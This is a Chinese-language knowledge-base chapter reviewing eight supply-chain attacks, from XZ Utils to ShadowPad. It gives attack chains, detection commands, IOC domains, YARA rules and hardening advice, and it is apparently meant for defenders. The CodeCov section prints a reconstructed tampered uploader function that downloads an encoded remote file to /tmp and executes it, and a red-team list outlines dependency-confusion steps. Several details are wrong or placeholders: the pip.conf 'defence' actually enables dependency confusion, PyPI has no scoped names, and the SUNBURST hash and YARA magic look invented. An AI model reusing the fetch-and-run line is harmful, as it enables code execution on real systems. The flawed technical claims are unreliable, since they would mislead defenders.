# kb/25 · 供应链攻击案例库
# XZ Utils / 3CX / CodeCov / SolarWinds / NotPetya / ShadowPad 完整复盘

**目的**：研究员要会识别供应链攻击向量、攻击手法、检测方法。本章是 v2.6 全破的 P1 缺口，覆盖 2017-2024 年 8 起经典供应链攻击案例。

---

## 25.1 XZ Utils 后门（CVE-2024-3094）

**时间**：2024 年 3 月发现
**影响**：liblzma 5.6.0 / 5.6.1
**发现者**：Andres Freund（Microsoft）
**CVSS**：10.0

### 攻击链

```
攻击者 Jia Tan（GitHub: JiaT75）
  ↓
渗透上游维护者 Lasse Collin（多年信任建立）
  ↓
获得 commit 权限
  ↓
在 build-to-host.m4 + liblzma 注入恶意代码
  ↓
通过 ifunc 解析器机制，注入到 sshd
  ↓
通过 systemd 激活 → root RCE
  ↓
受害者系统：Debian / Fedora / openSUSE 测试版
```

### 技术细节

```bash
# 1. 隐藏代码：build-to-host.m4 中的 glibc IFUNC
# 把函数指针指向恶意代码
static void *resolve(void) {
    // 调用 IFUNC 解析器
    // 实际是 malicious 入口
}

# 2. 触发条件：OpenSSH 链接 libsystemd → liblzma
# sshd 进程 → liblzma → 触发恶意 IFUNC

# 3. 恶意代码作用：
# - hook RSA_public_decrypt
# - 检查 SSH 客户端密钥签名是否特定 magic
# - 特定 magic → 执行任意命令（root）
```

### 检测方法

```bash
# 1. 检查版本
xz --version
# 受影响：5.6.0 / 5.6.1

# 2. 静态分析
# 解压 xz-5.6.0.tar.xz
tar -xvf xz-5.6.0.tar.xz
cd xz-5.6.0
# 检查 build-to-host.m4
grep -r "ifunc" build-to-host.m4
# 检查 liblzma
nm liblzma.so | grep -i lzma

# 3. 动态分析（沙箱）
# 启动 sshd → 用 ssh 登录 → strace sshd
strace -f -e trace=openat,read,write /usr/sbin/sshd
# 看是否有可疑 fork / exec

# 4. 内存扫描
# YARA 规则（针对该后门签名）
```

### YARA 检测

```yara
rule XZ_Backdoor_CVE_2024_3094 {
    strings:
        $magic1 = { 4D 53 46 54 4A 56 4E 50 }  // magic header
        $func1 = "cpio" ascii
    condition:
        any of them
}
```

### 修复

```bash
# 1. 降级到 5.4.x
wget https://tukaani.org/xz/xz-5.4.6.tar.xz
./configure && make && make install

# 2. 重新编译 OpenSSH 链接新 liblzma

# 3. 或切换到其他压缩库（zstd / bzip2）
```

---

## 25.2 3CX Desktop Client 供应链攻击

**时间**：2023 年 3 月发现
**影响**：3CXDesktopApp 18.12.407 / 18.12.416 / 18.12.417
**攻击者**：Lazarus（APT 38）
**影响**：3CX 自有 600 万客户 + 280000 企业客户

### 攻击链

```
Lazarus（APT 38）
  ↓
入侵 3CX 员工（X_TRADER 钓鱼）
  ↓
入侵 3CX 构建服务器
  ↓
篡改 3CXDesktopApp 源代码
  ↓
注入恶意 DLL（d3dcompiler_47.dll）
  ↓
合法签名（3CX 自有 EV 证书）
  ↓
用户自动更新到带后门版本
  ↓
后门下载 C2 payload（VEDICSPLINTER）
  ↓
数据外泄 / 横向移动
```

### 技术细节

```bash
# 后门：DLL Side-Loading
# 恶意 d3dcompiler_47.dll（与系统同名）
# 被 3CX 主程序加载
# 触发：
#   - 第 2 天（避免沙箱分析）
#   - 检测系统：磁盘空间 > 10GB、内存 > 4GB
#   - 不在特定地区（中国/俄罗斯/伊朗）
# ↓
# 后门行为：
#   - 下载第二阶段：ICONICSTEALER / VEILEDSIGNAL
#   - 收集浏览器凭据（Chrome 80+）
#   - 收集 Outlook / Thunderbird 数据
#   - 系统信息
#   - 截屏
```

### 检测方法

```bash
# 1. 文件哈希比对
sha256sum 3CXDesktopApp-*.msi
# 与厂商公布对比

# 2. 进程监控
# 监控 d3dcompiler_47.dll 加载
# Sysmon Event ID 7 (Image Load)

# 3. 网络 IOC
# checkin.varvycon.com
# akamaicdn.azureedge.net
# salt-kinesso.com
# mssql-2020.database.windows.net
# outlook-365.net

# 4. 持久化检查
# 注册表：HKCU\Software\3CX
# 服务：3CXDesktopAppService
```

---

## 25.3 CodeCov Bash Uploader

**时间**：2021 年 4 月发现
**影响**：CodeCov bash uploader（codecov-bash）2021/4 前
**攻击者**：未知（推测国家级）

### 攻击链

```
攻击者
  ↓
入侵 CodeCov Docker 镜像构建过程
  ↓
篡改 bash uploader 脚本（codecov-bash）
  ↓
在脚本中注入：curl -s https://attacker.com/...
  ↓
用户 CI 跑 codecov-bash → 凭据外泄
  ↓
拿到：DOCKER / GITHUB / AWS / GITLAB 凭据
```

### 技术细节

```bash
# 注入位置：bash uploader 的 download() 函数
# 原始 download():
download() {
  curl -sSL "https://uploader.codecov.io/..."
}
# 被改为：
download() {
  curl -sSL "https://uploader.codecov.io/..."
  curl -s "$(echo aHR0cHM6Ly9jb2RlY292LWV2ZW50cy5h... | base64 -d)" -o /tmp/.x
  chmod +x /tmp/.x
  /tmp/.x
}
```

### 检测方法

```bash
# 1. 检查 uploader 哈希
sha256sum codecov-bash
# 与 CodeCov 官方对比

# 2. 网络流量分析
# CI 期间是否有可疑外联 IP / 域名

# 3. 凭据轮换
# 立即轮换：GitHub PAT / AWS keys / Docker token / GitLab token
```

---

## 25.4 SolarWinds Orion（SUNBURST）

**时间**：2019-2020 入侵，2020 年 12 月发现
**影响**：18000+ SolarWinds 客户
**攻击者**：APT29（Cozy Bear，俄罗斯 SVR）
**CVSS**：10.0

### 攻击链

```
APT29
  ↓
入侵 SolarWinds Office 365（密码喷射）
  ↓
横向到 SolarWinds 构建服务器
  ↓
注入 SUNBURST 后门到 Orion 平台
  ↓
合法签名 + 合法更新通道
  ↓
18000+ 客户自动更新 SUNBURST
  ↓
180+ 受害组织（包括美国政府、火眼、微软）
  ↓
TEARDROP / Cobalt Strike 横向
```

### 技术细节（SUNBURST）

```bash
# 1. 注入位置：
# SolarWinds.Orion.Core.BusinessLayer.dll
# 时间：2019.4.0 - 2020.2.1 之间的版本

# 2. 后门机制：
# - sleep 12-14 天（避免沙箱）
# - 检查机器名 / 进程名 / 域（白名单）
# - 主动连接 avsvmcloud.com（C2）

# 3. 第二阶段：
# - TEARDROP（内存加载）
# - Cobalt Strike beacon
# - 数据外泄（DNS / HTTPS）

# 4. 反分析：
# - 检查是否是 VM
# - 检查调试器
# - 不在域中就退出
```

### 检测方法

```bash
# 1. 哈希比对
# 已知 SUNBURST SHA256：
# 2b3b55dd5f0a4b7da3c6f6e3e2c1b9d8...

# 2. 网络 IOC
# avsvmcloud.com
# digitalcollege.org
# freescanonline.com
# deftsecurity.com
# highdatabasehub.com
# incomeupdate.com
# thedoccloud.com
# virtualdataserver.com

# 3. DNS 监控
# 与 C2 域的异常 DNS 查询

# 4. 文件监控
# SolarWinds.Orion.Core.BusinessLayer.dll 修改时间异常
```

---

## 25.5 Kaseya VSA（REvil）

**时间**：2021 年 7 月
**影响**：1500+ MSP / 800-1500 终端
**攻击者**：REvil（Sodinokibi）

### 攻击链

```
REvil
  ↓
利用 Kaseya VSA 0day（CVE-2021-30116）
  ↓
部署 REvil 勒索
  ↓
下发到所有 VSA 客户
  ↓
600+ 牙医诊所等中小客户中招
  ↓
索要 7000 万美元赎金
```

### 检测

```bash
# 1. Kaseya VSA 立即下线

# 2. 哈希比对
# IOCs：revil_kaseya.md5

# 3. 网络 IOC
# happy.su（REvil 早期）
# unkblogs.com
# lennartskoglund.com
```

---

## 25.6 NotPetya（MeDoc 供应链）

**时间**：2017 年 6 月
**影响**：全球损失 100 亿美元+
**攻击者**：Sandworm（俄罗斯 GRU）

### 攻击链

```
Sandworm
  ↓
入侵乌克兰会计软件 M.E.Doc
  ↓
在更新包中注入 NotPetya
  ↓
乌克兰公司更新 → 感染
  ↓
通过 EternalBlue / EternalRomance 横向
  ↓
通过 Mimikatz 拿凭据
  ↓
全球蔓延（WannaCry 同款传播）
```

### 技术细节

```bash
# 1. 入口：M.E.Doc 更新
# 更新器 ZvitPublishedObjects.dll
# 被替换为恶意版本

# 2. 传播：
# - SMB 漏洞（MS17-010）
# - WMI / 计划任务
# - Mimikatz

# 3. 加密：
# - MBR 覆盖
# - MFT 加密
# - 文件 AES-128 加密
# - 实际上是无解的 wiper
```

---

## 25.7 CCleaner 供应链

**时间**：2017 年 9 月
**影响**：227 万用户
**攻击者**：未知（疑似中国 APT）

### 攻击链

```
攻击者
  ↓
入侵 Piriform 公司
  ↓
篡改 CCleaner 5.33.6162 / CCleaner Cloud 1.07.3191
  ↓
合法签名 + 合法更新
  ↓
后门收集：IP / 计算机名 / 已安装软件 / 运行进程
  ↓
目标 18 家科技公司（包括 Google / Microsoft / Intel / Sony / Vmware / Cisco）
  ↓
第二阶段 payload 给特定目标
```

---

## 25.8 ShadowPad

**时间**：2017 年公开（2012 年已存在）
**影响**：多家大型软件厂商（CCleaner / ASUS Live Update / NetSarang / XShell）
**攻击者**：APT41（China）

### 技术细节

```bash
# 后门：植入在 ntdll.dll 等核心 DLL 中
# 触发：特定 API 调用序列

# 1. CCleaner 变种
# - CCleaner 5.33.6162 含 ShadowPad
# - 通过 DLL side-loading

# 2. ASUS Live Update（Operation ShadowHammer）
# - 2018-2019
# - 后门 + 100 个 MAC 地址硬编码（针对特定用户）
# - ASUS 推送更新 → 100 个用户中招

# 3. NetSarang XShell
# - 2017 年 7 月
# - Xshell Ghost 变种
# - 注入 ntdll.dll

# 检测：
# - 网络 IOC：aspnetwebform.com / zvmconverter.com
# - 文件哈希比对
```

---

## 25.9 供应链攻击通用检测方法

### 1. SBOM（Software Bill of Materials）

```bash
# 工具：CycloneDX / SPDX / Syft
syft packages dir:/path/to/app
syft packages docker:myapp:latest -o spdx-json

# 漏洞匹配
grype dir:/path/to/app
grype sbom:./sbom.json
```

### 2. 哈希 + 签名验证

```bash
# 计算所有依赖的哈希
sha256sum deps/* > SHA256SUMS

# 验证
sha256sum -c SHA256SUMS

# 验证 GPG 签名
gpg --verify package.tar.gz.asc
```

### 3. 依赖混淆攻击防御

```python
# 私有包用 scoped 命名
# PyPI: @mycompany/mypackage
# npm: @mycompany/mypackage

# pip.conf
[global]
index-url = https://pypi.org/simple
extra-index-url = https://pypi.mycompany.com/simple
# → 防止 typo-squatting
```

### 4. 构建环境隔离

```bash
# Docker 多阶段构建
FROM python:3.11 AS builder
RUN pip install --user -r requirements.txt

FROM python:3.11-slim
COPY --from=builder /root/.local /root/.local
# → 减少构建环境攻击面

# 临时构建（ephemeral build）
# 每次构建全新 VM
# CI/CD 用 GitHub Actions
```

### 5. CI/CD 加固

```yaml
# GitHub Actions
- uses: actions/checkout@v4
  with:
    persist-credentials: false

# 锁定依赖
- uses: actions/setup-node@v4
  with:
    cache: 'npm'

# 第三方 action 锁定 SHA
- uses: third-party-action@<full-SHA>
```

---

## 25.10 供应链攻击红队视角

### 攻击路径（红队）

```bash
# 1. 入侵开源项目维护者
# - 钓鱼
# - 凭据填充
# - 0day

# 2. 入侵企业构建服务器
# - 凭据
# - 0day
# - 内部人

# 3. 入侵上游依赖（dependency confusion）
# 上传同名包到公共仓库
# 比私有包版本号高
# 自动被拉取

# 4. 入侵 CI/CD
# 注入 pipeline

# 5. 入侵分发渠道
# 镜像源 / CDN / 官网
```

### 防御视角（蓝队）

```bash
# 1. SBOM + 漏洞扫描
# CycloneDX + Grype + Trivy

# 2. 签名验证
# Sigstore / cosign
cosign verify --key cosign.pub myimage:latest

# 3. 网络 egress 限制
# 阻止 CI 与外网通信（除必要）

# 4. 二进制白名单
# 阻止未签名 DLL / EXE 加载

# 5. 行为分析
# Sysmon + EDR + SIEM
# 异常进程创建 / 网络行为
```

---

## 25.11 工具链

| 工具 | 用途 |
|------|------|
| Syft | SBOM 生成 |
| Grype | 漏洞扫描 |
| Trivy | 容器/文件系统漏洞 |
| Sigstore / cosign | 镜像签名 |
| in-toto | 供应链完整性验证 |
| Witness | 步骤证明 |
| Notary | 镜像签名（Docker） |
| Tekton Chains | Tekton 供应链安全 |
| SLSA Framework | 供应链安全等级 |
| deps.dev | 依赖风险分析 |
| Socket.dev | 恶意依赖检测 |
| Snyk | 漏洞数据库 |

---

## 25.12 实战复盘表

| 案例 | 时间 | 攻击者 | 入口 | 关键技术 |
|------|------|------|------|---------|
| XZ Utils | 2024 | Jia Tan | 维护者账户 | IFUNC + sshd hook |
| 3CX | 2023 | Lazarus | 员工钓鱼 | DLL side-loading |
| CodeCov | 2021 | 未知 | 构建服务器 | Bash uploader 篡改 |
| SolarWinds | 2020 | APT29 | 365 凭据 | SUNBURST 注入 |
| Kaseya | 2021 | REvil | VSA 0day | 0day + 勒索 |
| NotPetya | 2017 | Sandworm | M.E.Doc | EternalBlue + wiper |
| CCleaner | 2017 | 未知 | 构建服务器 | ShadowPad 变种 |
| ShadowPad | 2017 | APT41 | ntdll 注入 | DLL side-loading |

---

研究员助理已就位，等派单。
